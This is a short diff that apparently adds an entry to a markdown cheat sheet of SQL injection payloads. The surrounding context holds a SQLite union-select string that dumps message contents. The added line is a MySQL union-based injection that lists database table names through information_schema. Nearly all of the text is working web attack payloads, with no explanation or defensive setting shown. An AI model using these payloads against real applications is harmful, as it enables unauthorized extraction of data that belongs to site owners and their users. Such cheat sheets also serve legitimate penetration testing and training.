@@ -35,6 +35,10 @@ sqlite_version()
 ```
 12 union select 1,group_concat(message_content),3,4 from messages    
 ```
+4:
+```
+' and 1=0 union all select 1, (SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.tables WHERE table_schema=Database()),3,4,5,6,7-- -
+```
 > INPUT
 ```
 # MySQL and MSSQL
